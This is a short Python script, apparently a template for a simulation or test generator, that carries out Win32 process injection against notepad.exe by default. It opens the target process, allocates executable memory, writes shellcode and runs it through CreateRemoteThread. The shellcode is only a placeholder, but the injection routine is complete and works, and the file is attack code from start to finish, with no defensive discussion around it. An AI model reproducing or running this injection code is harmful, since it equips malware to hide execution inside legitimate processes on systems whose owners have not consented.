import ctypes
import sys
import struct

# Python Win32 Process Injection
# Target: {{ process_name | default('notepad.exe') }}

# Win32 API Constants
PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Shellcode (Placeholder)
shellcode = b"\x90\x90\x90"

kernel32 = ctypes.windll.kernel32

def inject(pid):
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print("[-] OpenProcess failed")
        return

    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), ctypes.byref(written))
    
    thread_id = ctypes.c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, 0, 0, arg_address, 0, 0, ctypes.byref(thread_id)):
        print("[-] CreateRemoteThread failed")
        return

    print(f"[+] Injected into PID {pid}")

if __name__ == "__main__":
    pid = int("{{ pid | default(0) }}")
    # TODO: Implement FindWindow/Snapshot logic if pid is 0
    # For sim, assume PID provided or 0
    if pid > 0:
        inject(pid)
    else:
        print("PID required.")
